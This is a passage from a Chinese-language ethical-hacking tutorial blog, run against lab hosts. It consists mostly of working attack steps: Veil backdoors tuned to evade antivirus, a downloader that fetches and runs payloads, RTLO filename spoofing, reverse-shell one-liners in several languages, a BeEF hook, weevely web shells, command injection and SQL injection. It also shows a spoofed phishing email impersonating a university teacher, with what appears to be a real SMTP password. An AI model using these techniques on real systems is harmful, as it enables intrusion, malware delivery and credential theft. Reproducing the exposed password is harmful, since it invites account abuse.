alt="86"><br>機器安裝的軟件(可用來入侵之後的提權等)<br><img src="/photo/Ethical_Hacking/87.jpg" alt="87"><br>目標機器上安裝的服務<br><img src="/photo/Ethical_Hacking/88.jpg" alt="88"><br>危險等級及技能等級分類<br><img src="/photo/Ethical_Hacking/89.jpg" alt="89"><br>詳細列表即可利用的攻擊工具<br><img src="/photo/Ethical_Hacking/90.jpg" alt="90"></p></blockquote><blockquote><p>舉例:<br><img src="/photo/Ethical_Hacking/91.jpg" alt="91"><br>可利用的模組(不一定成功)<br><img src="/photo/Ethical_Hacking/92.jpg" alt="92"><br>特定漏洞的引用<br><img src="/photo/Ethical_Hacking/93.jpg" alt="93"><br>解決方案:<br><img src="/photo/Ethical_Hacking/94.jpg" alt="94"></p></blockquote><blockquote><p>生成報告<br><img src="/photo/Ethical_Hacking/95.jpg" alt="95"><br>Audit Report:給程序員及技術人員的詳細資料<br>第三個:較少訊息的執行報告，給經理或沒有較多技術經驗的人編寫的</p></blockquote><h3 id="客戶端入侵"><a href="#客戶端入侵" class="headerlink" title="客戶端入侵"></a><strong>客戶端入侵</strong></h3><h4 id="veil"><a href="#veil" class="headerlink" title="veil"></a>veil</h4><blockquote><p>下載網址:<a href="https://github.com/Veil-Framework/Veil">Veil-Framework</a></p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd Downloads/</span><br><span class="line">chmod +x install-veil</span><br><span class="line">./install-veil </span><br></pre></td></tr></table></figure><blockquote><p>安裝好後，啟動</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/96.jpg" alt="96"><br>exit離開<br>info獲取特定工具訊息<br>list列出可用工具<br>options        顯示veil配置<br>update更新veil<br>use使用特定工具</p></blockquote><blockquote><p>veil有兩個主要工具:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/97.jpg" alt="97"></p><blockquote><p>1Evasion:用來生成不可偵測的后門<br>2Ordnance:用來生成有效負荷的工具(補助工具)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">use 1</span><br><span class="line">list   #列出可用的有效負載</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/98.jpg" alt="98"></p><blockquote><p>一般命名方式:<br>1.編成語言:將惡意代碼包裝成哪種語言<br>2.有效負載類型:目標計算機執行代碼的類型<br>3.用來連接的方式<br>例如:go&#x2F;meterpreter&#x2F;rev_https.py</p></blockquote><blockquote><p>特殊命名方式:<br>例如:lua&#x2F;shellcode_inject&#x2F;flat.py<br>產生一個正常的有效負載，這正常的有效負載注入一些惡意代碼</p></blockquote><h4 id="製作后門"><a href="#製作后門" class="headerlink" title="製作后門"></a>製作后門</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">veil</span><br><span class="line">use 1</span><br><span class="line">list</span><br><span class="line">use 15</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/99.jpg" alt="99"><br>上面為此後門訊息，下面為我們可設定的選項</p></blockquote><blockquote><p>設定自己ip及端口，讓目標連過來</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set LHOST 192.168.17.132</span><br><span class="line">set LPORT 8080</span><br></pre></td></tr></table></figure><blockquote><p>設定一些選項，使得不被防毒偵測(設定這些沒有原因只為了讓后門看起來不一樣)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">set PROCESSORS 1 #設定處理器</span><br><span class="line">set SLEEP 7      #設定睡眠?秒</span><br></pre></td></tr></table></figure><blockquote><p>生成后門</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">generate</span><br><span class="line">rev_https_8080  #給后門取名</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/100.jpg" alt="100"><br>生成成功</p></blockquote><h4 id="用metasploit框架監聽回應"><a href="#用metasploit框架監聽回應" class="headerlink" title="用metasploit框架監聽回應"></a>用metasploit框架監聽回應</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler </span><br><span class="line">set PAYLOAD windows/meterpreter/reverse_https</span><br><span class="line">show options</span><br><span class="line">set LHOST 192.168.17.132</span><br><span class="line">set LPORT 8080</span><br></pre></td></tr></table></figure><p><img src="/photo/Ethical_Hacking/101.jpg" alt="101"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure><blockquote><p>打開后門<br><img src="/photo/Ethical_Hacking/102.jpg" alt="102"></p></blockquote><blockquote><p>成功控制電腦<br><img src="/photo/Ethical_Hacking/103.jpg" alt="103"></p></blockquote><h4 id="BDFProxy-必須先成為中間人"><a href="#BDFProxy-必須先成為中間人" class="headerlink" title="BDFProxy(必須先成為中間人)"></a>BDFProxy(必須先成為中間人)</h4><blockquote><p>到安裝BDFProxy的位置(&#x2F;opt&#x2F;BDFProxy&#x2F;)<br>打開配置文件，將mode改成transparent<br><img src="/photo/Ethical_Hacking/104.jpg" alt="104"><br>將下圖區塊的host的ip改為自己電腦的，並儲存(如果目標是linux或mac就改linux和mac的區塊host)<br><img src="/photo/Ethical_Hacking/105.jpg" alt="105"></p></blockquote><blockquote><p>到終端機輸入以下指令:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/BDFProxy/</span><br><span class="line">./bdf_proxy.py</span><br></pre></td></tr></table></figure><blockquote><p>再打開一個終端(成為中間人)</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bettercap -iface eth0 -caplet /root/spoof.cap</span><br></pre></td></tr></table></figure><blockquote><p><img src="/photo/Ethical_Hacking/106.jpg" alt="106"></p></blockquote><blockquote><p>再開一個終端，用一個防火牆把bettercap收到的訊息轉到BDFProxy</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080 </span><br></pre></td></tr></table></figure><blockquote><p>開啟監聽</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole  --resource /opt/BDFProxy/bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure><blockquote><p>當目標下載任意exe檔時會被植入後門<br><img src="/photo/Ethical_Hacking/107.jpg" alt="107"></p></blockquote><h4 id="maltego"><a href="#maltego" class="headerlink" title="maltego"></a>maltego</h4><blockquote><p>開啟maltego，並登錄帳號密碼<br>開啟一的新檔<br><img src="/photo/Ethical_Hacking/108.jpg" alt="108"></p></blockquote><h4 id="將後門結合文件"><a href="#將後門結合文件" class="headerlink" title="將後門結合文件"></a>將後門結合文件</h4><blockquote><p>下載或編寫腳本:</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;StaticConstants.au3&gt;</span><br><span class="line">#include &lt;WindowsConstants.au3&gt;</span><br><span class="line"></span><br><span class="line">Local $urls = &quot;url1,url2&quot;</span><br><span class="line"></span><br><span class="line">Local $urlsArray = StringSplit($urls, &quot;,&quot;, 2 )</span><br><span class="line"></span><br><span class="line">For $url In $urlsArray</span><br><span class="line">$sFile = _DownloadFile($url)</span><br><span class="line">shellExecute($sFile)</span><br><span class="line"></span><br><span class="line">Next</span><br><span class="line"></span><br><span class="line">Func _DownloadFile($sURL)</span><br><span class="line">    Local $hDownload, $sFile</span><br><span class="line">    $sFile = StringRegExpReplace($sURL, &quot;^.*/&quot;, &quot;&quot;)</span><br><span class="line">    $sDirectory = @TempDir &amp; $sFile</span><br><span class="line">    $hDownload = InetGet($sURL, $sDirectory, 17, 1)</span><br><span class="line">    InetClose($hDownload)</span><br><span class="line">    Return $sDirectory</span><br><span class="line">EndFunc   ;==&gt;_GetURLImage</span><br></pre></td></tr></table></figure><blockquote><p>將url1和url2分別改成你的偽裝文件和後門的網址<br><img src="/photo/Ethical_Hacking/109.jpg" alt="109"><br>將副檔名改成au3</p></blockquote><blockquote><p>開啟compile(veil)<br>選擇編寫好的腳本<br>到IconArchive下載圖標或者上網將圖片轉為<a href="http://www.rw-designer.com/image-to-icon">上網將圖片轉為圖標</a><br><img src="/photo/Ethical_Hacking/111.jpg" alt="111"><br>convert<br>將檔案改名，並讓使用者下載並啟動(後門即可連接)<br><img src="/photo/Ethical_Hacking/112.jpg" alt="112"></p></blockquote><h4 id="將後門結合文件的副檔名偽裝"><a href="#將後門結合文件的副檔名偽裝" class="headerlink" title="將後門結合文件的副檔名偽裝"></a>將後門結合文件的副檔名偽裝</h4><blockquote><p>開啟一個文本<br>輸入檔名(例如:good.exe)<br>將檔名改變由右而左偽裝(goodgpj.exe)<br>開啟character，並找到由右到左的符號並在gpj前插入<br><img src="/photo/Ethical_Hacking/113.jpg" alt="113"><br><img src="/photo/Ethical_Hacking/114.jpg" alt="114"><br>並將新檔名複製到檔案上即可<br>ps:有時下載時會將符號拿掉，因此要壓縮後再讓使用者下載</p></blockquote><h4 id="發送後門利用假電子郵件"><a href="#發送後門利用假電子郵件" class="headerlink" title="發送後門利用假電子郵件"></a>發送後門利用假電子郵件</h4><blockquote><p><a href="https://app-smtp.brevo.com/">在brevo註冊一個帳號</a><br><img src="/photo/Ethical_Hacking/115.jpg" alt="115"></p></blockquote><blockquote><p>到kali linux裡打開發送郵件的程序</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sendemail --help</span><br><span class="line">sendemail -xu ray784523@gmail.com -xp zOsq1dZ0FM2Jmfgc -s smtp-relay.brevo.com:587 -f &quot;noreply@moodle.mcu.edu.tw&quot; -t &quot;ray784523@gmail.com&quot; -u &quot;陳詠智老師在moodle的發布一條訊息&quot; -m &quot;36201-36201視窗設計:陳 詠智老師在moodle的發布一條訊息,請查看以下檔案:https://www.dropbox.com/scl/fi/otcdpkv8bxavxixu8sppn/good.rar?rlkey=4gjotyd07f01ro8t7hwr7h506&amp;dl=1&quot; -o message-header=&quot;From: 陳 詠智經由(School of Information Technology)&quot;</span><br></pre></td></tr></table></figure><blockquote><p>sendemail -xu <a href="mailto:&#x72;&#97;&#121;&#x37;&#x38;&#x34;&#53;&#x32;&#51;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;">&#x72;&#97;&#121;&#x37;&#x38;&#x34;&#53;&#x32;&#51;&#64;&#x67;&#109;&#97;&#x69;&#108;&#46;&#x63;&#x6f;&#x6d;</a> -xp zOsq1dZ0FM2Jmfgc -s 伺服器名稱:端口 -f “發信人” -t “目標” -u “標題” -m “正文+木馬連結” -o message-header&#x3D;”From: 消息表頭&lt;電子郵件&gt;” -o message-charset&#x3D;UTF-8</p></blockquote><blockquote><p>模仿參考網站:<a href="https://easydmarc.com/tools/dmarc-lookup">easydmarc.com</a></p></blockquote><h4 id="Beef"><a href="#Beef" class="headerlink" title="Beef"></a>Beef</h4><blockquote><p>打開Beef,並登入<br><img src="/photo/Ethical_Hacking/116.jpg" alt="116"></p></blockquote><blockquote><p>讓使用者電腦想辦法運行以下js(中間人攻擊，dns欺騙，釣魚網站等):</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;http://&lt;IP&gt;:3000/hook.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure><blockquote><p>使得kali透過web與使用者掛勾<br>當使用者運行此代碼網頁時，beef會出現一個可控制的瀏覽器:<br><img src="/photo/Ethical_Hacking/117.jpg" alt="117"><br>圖示表示:<br><img src="/photo/Ethical_Hacking/118.jpg" alt="118"></p></blockquote><blockquote><p>點開控制電腦的主選單:<br><img src="/photo/Ethical_Hacking/119.jpg" alt="119"><br>commands:可執行的腳本<br>舉例:<br>alert<br><img src="/photo/Ethical_Hacking/120.jpg" alt="120"><br>設定完後按execute<br><img src="/photo/Ethical_Hacking/121.jpg" alt="121"><br>可執行任意js<br><img src="/photo/Ethical_Hacking/122.jpg" alt="122"><br>設定完後按execute<br><img src="/photo/Ethical_Hacking/123.jpg" alt="123"><br>可獲得電腦的螢幕截圖<br><img src="/photo/Ethical_Hacking/124.jpg" alt="124"><br>導向到別的網頁<br><img src="/photo/Ethical_Hacking/125.jpg" alt="125"><br>社交工程(竊取帳密)<br><img src="/photo/Ethical_Hacking/126.jpg" alt="126"><br>受害機畫面<br><img src="/photo/Ethical_Hacking/127.jpg" alt="127"><br>輸入受害機帳密之後<br><img src="/photo/Ethical_Hacking/128.jpg" alt="128"><br>偽裝更新植入後門<br><img src="/photo/Ethical_Hacking/129.jpg" alt="129"></p></blockquote><h4 id="預防方法"><a href="#預防方法" class="headerlink" title="預防方法:"></a>預防方法:</h4><blockquote><ol><li>開檔前檢查文件屬性</li><li>使用sandbox打開文件或用線上沙盒分析</li></ol></blockquote><h3 id="網站hack"><a href="#網站hack" class="headerlink" title="網站hack"></a>網站hack</h3><h4 id="資料收集網站"><a href="#資料收集網站" class="headerlink" title="資料收集網站"></a>資料收集網站</h4><blockquote><p>查找關於擁有者資訊<br>網址:<a href="https://whois.domaintools.com/">whois</a><br>查詢目標的技術<br>網址:<a href="https://sitereport.netcraft.com/">netcraft</a><br>關於網頁全面訊息<br>網址:<a href="https://www.robtex.com/">robtex</a></p></blockquote><h4 id="找出子網域"><a href="#找出子網域" class="headerlink" title="找出子網域"></a>找出子網域</h4><blockquote><p>工具:knockpy<br>指令:knockpy [網域]<br><img src="/photo/Ethical_Hacking/130.jpg" alt="130"></p></blockquote><h4 id="目標網站文件查找"><a href="#目標網站文件查找" class="headerlink" title="目標網站文件查找"></a>目標網站文件查找</h4><blockquote><p>工具:dirb<br>指令:dirb [target] [wordlist] [options]<br>使用方法:man dirb<br>指令:dirb <a href="http://192.168.212.104/mutillidae/">http://192.168.212.104/mutillidae/</a><br><img src="/photo/Ethical_Hacking/131.jpg" alt="131"></p></blockquote><h4 id="上傳漏洞"><a href="#上傳漏洞" class="headerlink" title="上傳漏洞"></a>上傳漏洞</h4><blockquote><p>工具:weevly<br>用途:生成shell，Web服务器上执行命令的后门，使得用户能够管理被攻击的Web服务器、执行服务器端代码<br>指令:weevely generate 097887 &#x2F;root&#x2F;shell.php<br>weevely generate 密碼 生成位置</p></blockquote><blockquote><p>啟動Metasploitable，並登錄DVWA網站<br><img src="/photo/Ethical_Hacking/132.JPG" alt="132"><br>上傳shell並複製其檔案存放的網址<br><img src="/photo/Ethical_Hacking/133.JPG" alt="133"></p></blockquote><blockquote><p>切換到kali<br>指令:weevely <a href="http://192.168.212.104/dvwa/hackable/uploads/shell.php">http://192.168.212.104/dvwa/hackable/uploads/shell.php</a> 097887<br>即可成功控制<br><img src="/photo/Ethical_Hacking/134.JPG" alt="134"></p></blockquote><h4 id="代碼執行漏洞"><a href="#代碼執行漏洞" class="headerlink" title="代碼執行漏洞"></a>代碼執行漏洞</h4><p><img src="/photo/Ethical_Hacking/135.jpg" alt="135"></p><blockquote><p>在網頁上輸入ip位置，網頁應用程式會傳回server，在server上執行ping<br>可用;作為分隔符號，將兩命令串接再一起，當執行完前面指令時，執行新的命令</p></blockquote><p><img src="/photo/Ethical_Hacking/136.jpg" alt="136"></p><blockquote><p>可參照以下指令來進行遠程連結<br>The following examples assums the hacker IP is 10.20.14 and use port 8080 for the connection.<br>Therefore in all f these cases you need to listen for port 8080 using the foolowing command<br>nc -vv -l -p 8080<br>BASH<br>bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.20.14.203&#x2F;8080 0&gt;&amp;1<br>PERL<br>perl -e ‘use Socket;$i&#x3D;”10.20.14”;$p&#x3D;8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname(“tcp”));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,”&gt;&amp;S”);open(STDOUT,”&gt;&amp;S”);open(STDERR,”&gt;&amp;S”);exec(“&#x2F;bin&#x2F;sh -i”);};’<br>Python<br>python -c ‘import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“10.20.14”,8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([“&#x2F;bin&#x2F;sh”,”-i”]);’<br>PHP<br>php -r ‘$sock&#x3D;fsockopen(“10.20.14”,8080);exec(“&#x2F;bin&#x2F;sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’<br>Ruby<br>ruby -rsocket -e’f&#x3D;TCPSocket.open(“10.20.14”,8080).to_i;exec sprintf(“&#x2F;bin&#x2F;sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d”,f,f,f)’<br>Netcat<br>nc -e &#x2F;bin&#x2F;sh 10.20.14 8080</p></blockquote><blockquote><p>監聽8080端口<br><img src="/photo/Ethical_Hacking/137.jpg" alt="137"><br>在網頁應用程式輸入:192.168.1.1;nc -e &#x2F;bin&#x2F;sh 192.168.212.104 8080<br><img src="/photo/Ethical_Hacking/138.jpg" alt="138"></p></blockquote><p><img src="/photo/Ethical_Hacking/139.jpg" alt="139"></p><h4 id="local-File-Inclusion"><a href="#local-File-Inclusion" class="headerlink" title="local File Inclusion"></a>local File Inclusion</h4><blockquote><p>利用此類型漏洞讀取同一伺服器的所有文件<br><img src="/photo/Ethical_Hacking/140.jpg" alt="140"><br>修改URL參數<br><img src="/photo/Ethical_Hacking/141.jpg" alt="141"></p></blockquote><h4 id="REMOTE-FILE-INCLUSION"><a href="#REMOTE-FILE-INCLUSION" class="headerlink" title="REMOTE FILE INCLUSION"></a>REMOTE FILE INCLUSION</h4><blockquote><p>伺服器支持allow_url_fopen和allow_url_include<br>伺服器設定檔:&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini<br><img src="/photo/Ethical_Hacking/142.jpg" alt="142"><br>重啟網頁伺服器:sudo &#x2F;etc&#x2F;init.d&#x2F;apache2 restart</p></blockquote><blockquote><p>在自己本地機上創建並編輯一個文件:<br><img src="/photo/Ethical_Hacking/143.jpg" alt="143"></p></blockquote><blockquote><p>在 PHP 中，passthru() 函数是用来执行外部程序并且直接显示原始输出的。它与其他执行外部命令的函数（如 exec()、shell_exec() 和 system()）类似，但有一些区别。<br>passthru() 通常用于需要捕获程序输出的场景，特别是二进制数据，如直接从 PHP 脚本传输图像或音频文件。当调用 passthru() 时，PHP 会等待外部程序执行完成，并将程序的原始输出直接传递到 PHP 的输出流。</p></blockquote><blockquote><p>將文件放在:<br><img src="/photo/Ethical_Hacking/144.jpg" alt="144"></p></blockquote><blockquote><p>更改網址<br><img src="/photo/Ethical_Hacking/145.jpg" alt="145"></p></blockquote><p><img src="/photo/Ethical_Hacking/146.jpg" alt="146"></p><h3 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h3><h4 id="myspl"><a href="#myspl" class="headerlink" title="myspl"></a>myspl</h4><blockquote><p>連接:mysql -u 帳號 -h ip地址<br>列出所有資料庫:show databases;<br>選擇資料庫:use [資料庫名稱]<br>列出所在資料庫中的資料表:show tables;<br>列出資料表內容:select * from [資料表名稱];</p></blockquote><h4 id="SQL-Injection-POST"><a href="#SQL-Injection-POST" class="headerlink" title="SQL Injection(POST)"></a>SQL Injection(POST)</h4><blockquote><p><img src="/photo/Ethical_Hacking/147.jpg" alt="147"><br>當輸入帳密為zaid和123456時，後端會執行這指令從資料庫搜尋帳密是否存在:SELECT * FROM accounts WHERE username&#x3D;’zaid’ AND password&#x3D;’123456’<br>當我們輸入帳密為zaid和&#39; and 1&#x3D;1 #會變成SELECT * FROM accounts WHERE username&#x3D;’zaid’ AND password&#x3D;&#39;&#39; or 1&#x3D;1 #’，1&#x3D;1為ture，因此不管密碼是否正確後面都為真<br>符號:#可使後面程式碼被註解<br>當我們輸入帳密為admin’#和&#39; and 1&#x3D;1 #會變成SELECT * FROM accounts WHERE username&#x3D;’admin’# AND password&#x3D;’’，#會註解後面程式碼，因此不用驗證密碼</p></blockquote><h4 id="SQL-Injection-GET"><a href="#SQL-Injection-GET" class="headerlink" title="SQL Injection(GET)"></a>SQL Injection(GET)</h4><p><img src="/photo/Ethical_Hacking/148.jpg" alt="148"></p><blockquote><p>上圖網址:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a><br>注入order by:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ order by 1%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br>%23為#的編碼<br>当攻击者尝试 ORDER BY 10000 这样的注入时，它们可能在测试数据库表中有多少列。如果 ORDER BY 10000 导致错误，表示表中没有那么多列。通过逐步调整数字，攻击者可以确定表的确切列数。<br>當輸入5時正常<br><img src="/photo/Ethical_Hacking/149.jpg" alt="149"><br>輸入6時出錯<br><img src="/photo/Ethical_Hacking/150.jpg" alt="150"><br>代表這個帳戶表有5列<br>可注入union slect 1,2,3,4,5:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,2,3,4,5%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/151.jpg" alt="151"><br>確定有5列，其中2,3,4會被顯示<br>可注入union slect 1,database(),user(),version(),5:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,database(),user(),version(),5%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/152.jpg" alt="152"><br>可知資料庫為:owasp10，使用者:root@locale及版本<br>可注入union select 1,table_name,null,null,5 from information_schema.tables(SQL預設的表):<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,table_name,null,null,5 from information_schema.tables%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/153.jpg" alt="153"></p></blockquote><blockquote><p>SELECT 1, table_name, NULL, NULL, 5：这是在选择几列数据。第一列和最后一列是硬编码的数值1和5。第二列是 table_name，它来自于 information_schema.tables 这个特殊的表，该表存储了数据库中所有表的名称。第三和第四列是用 NULL 填充的，这通常是因为原始 SQL 查询需要有相同数目的列来匹配结构，而攻击者可能不关心这些列的具体内容。</p></blockquote><blockquote><p>FROM information_schema.tables：information_schema 是一个内建数据库，包含了数据库的元数据，如表名、列名、数据类型等信息。information_schema.tables 是其中的一个表，包含了所有用户表和系统表的列表</p></blockquote><blockquote><p>可注入union select 1,table_name,null,null,5 from information_schema.tables where table_schema &#x3D; ‘owasp10’:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,table_name,null,null,5 from information_schema.tables where table_schema &#x3D; ‘owasp10’%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/154.jpg" alt="154"></p></blockquote><blockquote><p>可注入union select 1,column_name,null,null,5 from information_schema.column where table_name &#x3D; ‘accounts’:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,column_name,null,null,5 from information_schema.columns where table_name &#x3D; ‘accounts’%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/155.jpg" alt="155"><br>FROM information_schema.columns 指定了查询的数据来源。information_schema.columns 是数据库的一个特殊表，它包含了数据库中所有表的列信息。</p></blockquote><blockquote><p>可注入union select 1,username,password,is_admin,5 from accounts:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select 1,username,password,is_admin,5 from accounts%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/156.jpg" alt="156"></p></blockquote><h4 id="SQL注入文件"><a href="#SQL注入文件" class="headerlink" title="SQL注入文件"></a>SQL注入文件</h4><blockquote><p>讀取伺服器文件<br>可注入union select null,load_file(‘&#x2F;etc&#x2F;passwd’),null,null,null :<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select null,load_file(‘&#x2F;etc&#x2F;passwd’),null,null,null%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details</p></blockquote><blockquote><p>向伺服器寫入一些內容<br>可注入union select null,’example example’,null,null,null into outfile ‘&#x2F;tmp&#x2F;example.txt’:<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi</a>‘ union select null,’example example’,null,null,null into outfile ‘&#x2F;tmp&#x2F;example.txt’%23&amp;password&#x3D;zhi12345&amp;user-info-php-submit-button&#x3D;View+Account+Details<br><img src="/photo/Ethical_Hacking/157.jpg" alt="157"><br><img src="/photo/Ethical_Hacking/158.jpg" alt="158"></p></blockquote><h4 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h4><blockquote><p>sqlmap -u ‘網址’<br>查看所有資料庫:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –dbs<br><img src="/photo/Ethical_Hacking/159.jpg" alt="159"><br>查看當前帳號:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –current-user<br>查看當前數據庫:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –current-db<br>查看數據庫的table:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –tables -D ‘owasp10’<br>查看table columns名稱:sqlmap -u ‘<a href="http://192.168.212.102/mutillidae/index.php?page=user-info.php&username=zhi&password=zhi12345&user-info-php-submit-button=View+Account+Details">http://192.168.212.102/mutillidae/index.php?page=user-info.php&amp;username=zhi&amp;password=zhi12345&amp;user-info-php-submit-button=View+Account+Details</a>‘ –columns -T accounts -D owasp10<br>查看所有數據:sqlmap -u ‘<a 